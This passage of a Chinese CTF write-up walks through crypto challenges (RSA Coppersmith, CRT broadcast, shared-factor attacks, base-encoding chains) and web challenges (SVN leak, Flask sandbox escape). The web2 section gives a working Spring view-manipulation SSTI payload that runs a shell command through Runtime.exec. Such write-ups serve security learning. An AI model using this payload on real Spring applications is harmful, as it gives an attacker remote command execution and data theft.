encoded.rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空列表，用于存储编码字符在特定字符串中的索引</span></span><br><span class="line">    indices = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded:</span><br><span class="line">        <span class="comment"># 如果编码字符在特定字符串中，将其索引添加到列表中</span></span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> s:</span><br><span class="line">            indices.append(s.index(char))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空字符串，用于存储二进制表示的索引</span></span><br><span class="line">    binary_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> indices:</span><br><span class="line">        <span class="comment"># 将索引转换为 6 位二进制字符串并拼接起来</span></span><br><span class="line">        binary_str += <span class="built_in">format</span>(index, <span class="string">&#x27;06b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个空列表，用于存储解码后的字节</span></span><br><span class="line">    flag_bytes = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>):</span><br><span class="line">        <span class="comment"># 每次取 8 位二进制字符串</span></span><br><span class="line">        byte = binary_str[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># 将二进制字符串转换为整数，再转换为 ASCII 字符并添加到列表中</span></span><br><span class="line">        flag_bytes.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>)))</span><br><span class="line">    <span class="comment"># 将列表中的字符拼接成一个字符串作为解码后的结果</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_bytes)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用解码函数并将结果赋值给 decoded_flag</span></span><br><span class="line">decoded_flag = decode(encoded)</span><br><span class="line"><span class="comment"># 打印解码后的结果</span></span><br><span class="line"><span class="built_in">print</span>(decoded_flag)</span><br></pre></td></tr></table></figure>

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926200509596.png" alt="image-20240926200509596" style="zoom: 67%;" />



<h3 id="收获-8"><a href="#收获-8" class="headerlink" title="收获"></a>收获</h3><p>变表的base64，确实挺烦人的</p>
<h2 id="crypto2-justmath"><a href="#crypto2-justmath" class="headerlink" title="crypto2-justmath"></a>crypto2-justmath</h2><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤"></a>步骤</h3><p>题目给了一个函数图像，还有一个脚本</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240928153245194.png" alt="image-20240928153245194"></p>
<p>所给脚本的主要目的应该是通过 RSA 加密<code>FLAG</code>，同时进行一些符号数学的计算和绘图操作</p>
<p>构造第一段脚本，使用SageMath解方程恢复部分flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> symbols, solve <span class="keyword">as</span> sym_solve</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义变量 x。</span></span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># y_value 列表</span></span><br><span class="line">y_value = [<span class="number">3149069</span>, <span class="number">2271689</span>, <span class="number">2337632</span>, <span class="number">3068562</span>, <span class="number">67697</span>, <span class="number">2337632</span>, <span class="number">3068562</span>, <span class="number">67697</span>, <span class="number">2143547</span>, <span class="number">2543093</span>, <span class="number">1844472</span>, <span class="number">2206998</span>, <span class="number">67697</span>, <span class="number">1844472</span>, <span class="number">2686547</span>, <span class="number">2020317</span>, <span class="number">67697</span>, <span class="number">3149069</span>, <span class="number">2271689</span>, <span class="number">2081324</span>, <span class="number">67697</span>, <span class="number">2143547</span>, <span class="number">2543093</span>, <span class="number">1844472</span>, <span class="number">2206998</span>, <span class="number">67697</span>, <span class="number">2337632</span>, <span class="number">3068562</span>, <span class="number">67697</span>, <span class="number">2143547</span>, <span class="number">2543093</span>, <span class="number">1844472</span>, <span class="number">2206998</span>, <span class="number">3752378</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 recovered_flag 字符串。</span></span><br><span class="line">recovered_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历 y_value 列表。</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> y_value:</span><br><span class="line">    <span class="comment"># 构造三次方程。</span></span><br><span class="line">    eq = <span class="number">3</span> * x**<span class="number">3</span> - <span class="number">4</span> * x**<span class="number">2</span> + <span class="number">5</span> * x + <span class="number">12</span> == value</span><br><span class="line">    <span class="comment"># 求解方程。</span></span><br><span class="line">    solutions = sym_solve(eq, x)</span><br><span class="line">    <span class="comment"># 假设方程有三个解，取第三个解并转换为字符添加到 recovered_flag。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(solutions) &gt;= <span class="number">3</span>:</span><br><span class="line">        recovered_flag += <span class="built_in">chr</span>(solutions[<span class="number">2</span>].evalf())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印 recovered_flag。</span></span><br><span class="line"><span class="built_in">print</span>(recovered_flag)</span><br></pre></td></tr></table></figure>



<p>构造脚本通过遍历数值列表，为每个值构造特定三次方程，用 SageMath 的<code>solve</code>函数求解，假设方程有三个解并取第三个解转换为字符，拼接成字符串以恢复部分 flag。</p>
<p>在一定范围内尝试不同长度的扩展，构造多项式后通过<code>small_roots</code>方法找小根，若找到则得到可能的原始消息并打印。构造第二段EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知 flag 的一部分（前缀）。</span></span><br><span class="line">flag = <span class="string">b&quot;this is flag and the flag is flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 的公钥参数：模 n 和指数 e。</span></span><br><span class="line">n = <span class="number">2260375559104345425590426977960386256287009777233277062625487017885931446911942921201492850167115455071935831283269948569220356763988762825230315520633702443866690239945242948370781975714325308306543337600783340792458991506685843729962897796956171467876531084194426101796617903015810156717396227079274786269217370618477266867389155551378798713259843750289765858717627925689021561352438080039804957145513478767641674644346609224034274906228784593435462413278410143</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">1683427726786225271109289808778075351906457081282891335272956455076290407290946927840180672315908981114229434899424882579823897506730018911375238394076293908946844135295984336122170362703361647325169444373502665686779049846717305377396296752361918921007897449738856962248716579014267597667341690453460130215215256776249910808564677407383996700090361822122676428069577517468851642648993930679875398568383201032360229083338487146673018350740571719960730053254352184</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模 n 的多项式环。</span></span><br><span class="line">R = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试使用 Coppersmith 的小根数攻击来找到 m（原始消息）。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="comment"># 构造可能的高位 m 值，通过扩展已知的 flag 前缀并添加零字节。</span></span><br><span class="line">    mhigh = bytes_to_long(flag + <span class="string">b&quot;\x00&quot;</span> * <span class="number">32</span> + <span class="string">b&quot;&#125;&quot;</span>)</span><br><span class="line">    <span class="comment"># 构造多项式，目标是找到小的 x 值使得该多项式为零。</span></span><br><span class="line">    f = (mhigh + x) ** e - c</span><br><span class="line">    <span class="comment"># 使用 small_roots 方法尝试找到多项式的小根。</span></span><br><span class="line">    res = f.small_roots(X=<span class="number">256</span> ** i, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.05</span>)</span><br><span class="line">    <span class="keyword">if</span> res!= []:</span><br><span class="line">        <span class="comment"># 将找到的小根值加到 mhigh 上得到可能的 m 值。</span></span><br><span class="line">        m = mhigh + <span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># 将 m 值转换回字节串并打印。</span></span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<p>利用已知的 flag 前缀，结合 RSA 公钥参数和密文，通过不断扩展可能的高位消息值并构造多项式，使用 Coppersmith 的小根数攻击尝试找到满足条件的小根，从而恢复出完整的 flag。</p>
<h3 id="收获-9"><a href="#收获-9" class="headerlink" title="收获"></a>收获</h3><p>和函数相关，题目暗指SageMath，密码学就是应该这样，全方位考查数学知识，这题真不错</p>
<h2 id="crypto3-base"><a href="#crypto3-base" class="headerlink" title="crypto3-base"></a>crypto3-base</h2><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤"></a>步骤</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212821051.png" alt="image-20240923212821051"></p>
<p>全是表情包，很明显<strong>base100</strong>解密</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212852566.png" alt="image-20240923212852566"></p>
<p>看得出来<strong>base64</strong>，接着解</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923212955282.png" alt="image-20240923212955282"></p>
<p>一键解密<strong>base85</strong>有结果</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923213215173.png" alt="image-20240923213215173"></p>
<p><strong>base91</strong></p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923213248687.png" alt="image-20240923213248687"></p>
<p>接着进行<strong>base62</strong>解码</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924195944466.png" alt="image-20240924195944466">最后ciphey一把梭，获得flag</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240923215555927.png" alt="image-20240923215555927"></p>
<h3 id="收获-10"><a href="#收获-10" class="headerlink" title="收获"></a>收获</h3><p>主要就是base62有点恶心，其他都是常规解密</p>
<h2 id="crypto4-easy-crypto1"><a href="#crypto4-easy-crypto1" class="headerlink" title="crypto4-easy_crypto1"></a>crypto4-easy_crypto1</h2><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤"></a>步骤</h3><p>看着有点眼熟，好像是原题，确实是攻防世界 crypto—simpleRSA 。</p>
<p>首先求解E1：</p>
<p>通过遍历特定范围内的素数作为一个因子，根据已知关系和 RSA 参数，尝试找到满足条件的 RSA 模数因子<code>p</code>和<code>q</code>，进而计算私钥<code>d</code>并尝试解密密文，若找到合适的因子则输出相关信息，否则提示未能成功分解模数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">15</span>, <span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        q = next_prime(i * iroot(n // i, <span class="number">2</span>)[<span class="number">0</span>] + <span class="number">38219</span>)</span><br><span class="line">        <span class="keyword">if</span> n % q == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = n // q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">E1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(E1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>接着求解E2：</p>
<p>利用中国剩余定理来求解一个同余方程组，然后对得到的结果进行开<code>e</code>次方运算。通过已知的多个模数<code>ns</code>和对应的余数<code>cs</code>，结合给定的公钥指数<code>e</code>，最终尝试恢复出一个可能的数值<code>E2</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> mod_inverse</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义中国剩余定理求解函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">modulus, remainders</span>):</span><br><span class="line">    Sum = <span class="number">0</span></span><br><span class="line">    prod = <span class="number">1</span>  <span class="comment"># 初始化乘积为 1</span></span><br><span class="line">    <span class="keyword">for</span> m_i <span class="keyword">in</span> modulus:</span><br><span class="line">        prod *= m_i</span><br><span class="line">    <span class="keyword">for</span> m_i, r_i <span class="keyword">in</span> <span class="built_in">zip</span>(modulus, remainders):</span><br><span class="line">        p = prod // m_i</span><br><span class="line">        <span class="comment"># 计算模逆元</span></span><br><span class="line">        Sum += r_i * (mod_inverse(p, m_i) * p)</span><br><span class="line">    <span class="keyword">return</span> Sum % prod</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多个模数列表</span></span><br><span class="line">ns = [<span class="number">15863230586500684911356384742123404120213699052018048588650392009927565369685497256344682150189923131009586323640507773706997704860898682946308031020361302334248895233255911348365179153799197341744863134926804603973507415697810440916305092395180382239729550833607847524005391137474497849077097574452115379368463540087172800902210822143687014813631366360652583216269138116785489485772437870528892032119729929607857459621078790511144060710035933887337208301078892163837203412081114510143406013892393607932596921308889058909544584619676380766485493114814753878272881866907210235681877689493671668534251778397658670518117</span>,</span><br><span class="line">      <span class="number">14144098469438619358682652828507744381697293556670717685553585719665002440476256008471235313826051740009083510860714991201047915737216102220242621674841600987122005914542061963618272275986835928673920375768272390912778741502655909281390948606467847118377641357547931472588836726339758576038273820470879637555458446243401248151675266602656677360819563744765522495640821496694918515669243614141704744848980746101569785439728585144841655665959389460512628800782742764147773150430552859331269667626942993392101897661719871375721143240270211821269260950380944670195863016621594387236339317938305273510719419578308449465183</span>,</span><br><span class="line">      <span class="number">27563822879593503938377821960427219022565215631856333510782568496016547757945464794632272818101891677705256471714805217606503652132995136255720639088424576003650628211271025648183600635145895528466199068640094470078526413324708028578289949241288828542143203769199399500669311878391255837977932634772778594526940501234736059441483897017015324765266787399950699732518347518591167932031031320265136158304460199654008895095274754918153773566824931440342525688741289235153882699461549523425169846266597156773535163599640189457171272058311480951820887261040891344076039474315985825984444520336790670313179493074014037981261</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应的余数列表</span></span><br><span class="line">cs = [<span class="number">3833095607830862948079097323254872789586576953317671099752083261949616608759231291050566542764984974722790226120399722937104503590740358249900089784508490830379531632752169777949200718567033018577184658177019404903817920024468923715441355404672443007723525750768430895425376124679225715687382380114628103058312176343693900115638265002657622618744666247132114654135429040069316368839938881716554901593031901272992940200484460436193699175500376368456706998564064693820008778900344357745691652875500810447147088715289581351501876012044611990972521570253106671158207677490849249612002954497927762168699886110455354481924</span>,</span><br><span class="line">      <span class="number">1502420121177211156091634258259634977709023894278792755694473756163084431123774101512866316989917922052023168401167212284219907272528117024670443698990238243030221117004372456475521502350404137469088570170885409265567084376069256924135270283335242133163303599239181417949980292944203204296598188175632723968779672994090788585343302473442389865459398142634104331743517384589200789331489394375604801951994831647339839112698394141328178967516636452592385248135340133712522135715943787590172334743893259621909532456281362868290556461907936774231166936915669816509378419892149164552548131776979706381641477878931403040942</span>,</span><br><span class="line">      <span class="number">8992204063713908492214256291861339175525948946919629972908439132005643626148678347198381531633907182877152728077958345519083406637446972079387161726967295886447791613166577391233866583354793842121902234644830640050181130381996083089350911224037154798259291124104894554037604500881250119806371348673833105103600782286898276354573884788251542211434143476774391457587885772379990104835187104619922442613860682792470389490804228050671124495925536024571104944112397143299499508504917890140939438891891453283594000764399193028606955089853654071198909973555844004685149713774167524224100487937899126480545681565581673958854</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥指数</span></span><br><span class="line">e = <span class="number">89</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理求解同余方程组</span></span><br><span class="line">m_e = chinese_remainder(ns, cs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对结果进行开 e 次方运算</span></span><br><span class="line">E2 = gmpy2.iroot(m_e, e)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(E2)</span><br></pre></td></tr></table></figure>

<p>最后就是破解 RSA 加密 求解P以及flag</p>
<p>由于给定了两个 RSA 模数<code>n1</code>和<code>n2</code>，且它们有共同因子<code>P</code>，通过求最大公约数得到<code>P</code>，进而求出<code>Q1</code>和<code>Q2</code>。计算出相应的欧拉函数<code>phi</code>后，由于公钥指数<code>E1</code>和<code>phi</code>有共同因子，不能直接求私钥<code>d</code>，但可以通过一些计算得到。先解密得到<code>m</code>，然后在<code>P</code>和<code>Q1</code>的有限域下分别对<code>m</code>的某个幂次进行开方求解，最后通过中国剩余定理组合结果，遍历所有可能的结果，判断是否包含<code>flag</code>字符串。</p>
<p>构造最后一段EXP：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 和 n2 是两个 RSA 模数，c1 和 c2 是对应的密文，E1 和 E2 是公钥指数</span></span><br><span class="line">n1 = <span class="number">21655617838358037895534605162358784326495251462447218485102155997156394132443891540203860915433559917314267455046844360743623050975083617915806922096697304603878134295964650430393375225792781804726292460923708890722827436552209016368047420993613497196059326374616217655625810171080545267058266278112647715784756433895809757917070401895613168910166812566545593405362953487807840539425383123369842741821260523005208479361484891762714749721683834754601596796707669718084343845276793153649005628590896279281956588607062999398889314240295073524688108299345609307659091936270255367762936542565961639163236594456862919813549</span></span><br><span class="line">n2 = <span class="number">24623016338698579967431781680200075706241014384066250660360949684385831604822817314457973559632215801205780786144608311361063622813017396858888436529116737754653067203843306015767091585697803364656624926853551997229897087731298797904208292585562517602132663331748784390752958757661484560335406769204491939879324079089140420467301773366050084810282369044622442784113688062220370531522036512803461607049619641336524486507388232280683726065679295742456158606213294533956580462863488082028563360006966912264908424680686577344549034033470952036766850596897062924137344079889301948258438680545785139118107899367307031396309</span></span><br><span class="line">c1 = <span class="number">2615722342860373905833491925692465899705229373785773622118746270300793647098821993550686581418882518204094299812033719020077509270290007615866572202192731169538843513634106977827187688709725198643481375562114294032637211892276591506759075653224150064709644522873824736707734614347484224826380423111005274801291329132431269949575630918992520949095837680436317128676927389692790957195674310219740918585437793016218702207192925330821165126647260859644876583452851011163136097317885847756944279214149072452930036614703451352331567857453770020626414948005358547089607480508274005888648569717750523094342973767148059329557</span></span><br><span class="line">c2 = <span class="number">6769301750070285366235237940904276375318319174100507184855293529277737253672792851212185236735819718282816927603167670154115730023644681563602020732801002035524276894497009910595468459369997765552682404281557968383413458466181053253824257764740656801662020120125474240770889092605770532420770257017137747744565202144183642972714927894809373657977142884508230107940618969817885214454558667008383628769508472963039551067432579488899853537410634175220583489733111861415444811663313479382343954977022383996370428051605169520337142916079300674356082855978456798812661535740008277913769809112114364617214398154457094899399</span></span><br><span class="line">E1 = <span class="number">377312346502536339265</span></span><br><span class="line">E2 = <span class="number">561236991551738188085</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算共同因子 p，n1 = P * Q1，n2 = P * Q2，通过求最大公约数得到 P</span></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 Q1</span></span><br><span class="line">q = n1//p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算欧拉函数 phi</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 E1 和 phi 的最大公约数 t</span></span><br><span class="line">t = gmpy2.gcd(gmpy2.mpz(E1),phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = gmpy2.invert(E1//t,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密得到 m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Zmod(p) 有限域下定义多项式环并构造方程求解</span></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x**t - m</span><br><span class="line">f = f.monic()</span><br><span class="line">results1 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Zmod(q) 有限域下定义多项式环并构造方程求解</span></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x**t - m</span><br><span class="line">f = f.monic()</span><br><span class="line">results2 = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历结果组合得到 M，使用中国剩余定理（CRT）求解并判断是否包含 flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> results1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> results2:</span><br><span class="line">        param1 = [<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>])]</span><br><span class="line">        param2 = [p,q]</span><br><span class="line">        M = CRT_list(param1,param2)</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(M))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<h3 id="收获-11"><a href="#收获-11" class="headerlink" title="收获"></a>收获</h3><p>不得不说真难，哪怕是原题我也不太会</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1-input-data"><a href="#web1-input-data" class="headerlink" title="web1-input_data"></a>web1-input_data</h2><h3 id="步骤-12"><a href="#步骤-12" class="headerlink" title="步骤"></a>步骤</h3><p>提示是svn泄露</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922160722366.png" alt="image-20240922160722366"></p>
<p>访问&#x2F;.svn，接着进行查找，直接获得flag</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922160746079.png" alt="image-20240922160746079"></p>
<h3 id="收获-12"><a href="#收获-12" class="headerlink" title="收获"></a>收获</h3><p>正常的svn泄露，还好。</p>
<h2 id="web2-admin"><a href="#web2-admin" class="headerlink" title="web2-admin"></a>web2-admin</h2><h3 id="步骤-13"><a href="#步骤-13" class="headerlink" title="步骤"></a>步骤</h3><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922175219339.png" alt="image-20240922175219339"></p>
<p>题目提示从admin到管理员</p>
<p>首先用dirsearch扫描试试</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926173521134.png" alt="image-20240926173521134"></p>
<p>接着访问，访问.&#x2F;error能看出来是java框架</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926192744443.png" alt="image-20240926192744443"></p>
<p>经过测试，发现存在一个漏洞，可以通过 “&#x2F;admin;&#x2F;” 路由来触发 Spring View Manipulation（Java）中的服务器端模板注入（SSTI）。接着构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin;/path=__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat /flag%22).getInputStream()).next()%7D__%3A%3A.x</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240926173842378.png" alt="image-20240926173842378"></p>
<h3 id="收获-13"><a href="#收获-13" class="headerlink" title="收获"></a>收获</h3><p>考查Java的SSTI模板注入，相当有意思，也是长见识了。</p>
<h2 id="web3-flask"><a href="#web3-flask" class="headerlink" title="web3-flask"></a>web3-flask</h2><h3 id="步骤-14"><a href="#步骤-14" class="headerlink" title="步骤"></a>步骤</h3><p>分析题目可知是考察沙箱逃逸</p>
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172415468.png" alt="image-20240922172415468" style="zoom:67%;" />

<p>使用自动化的 Python 沙箱逃逸 payload bypass 框架即可</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240922172133867.png" alt="image-20240922172133867"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，将输入字符串转换为特定的格式化字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_percent_c_format</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="comment"># 创建一个由 &#x27;%c&#x27; 组成的字符串，长度与输入字符串相同</span></span><br><span class="line">    format_str = <span class="string">&#x27;%c&#x27;</span> * <span class="built_in">len</span>(input_str)</span><br><span class="line">    <span class="comment"># 将输入字符串中的每个字符转换为其 ASCII 码值，并以逗号连接</span></span><br><span class="line">    values = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(char)) <span class="keyword">for</span> char <span class="keyword">in</span> input_str)</span><br><span class="line">    <span class="comment"># 返回格式化后的字符串，并使用括号包裹值列表</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&#x27;<span class="subst">&#123;format_str&#125;</span>&#x27;%(<span class="subst">&#123;values&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试字符串</span></span><br><span class="line">test_str = <span class="string">&quot;&quot;&quot;/flag&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 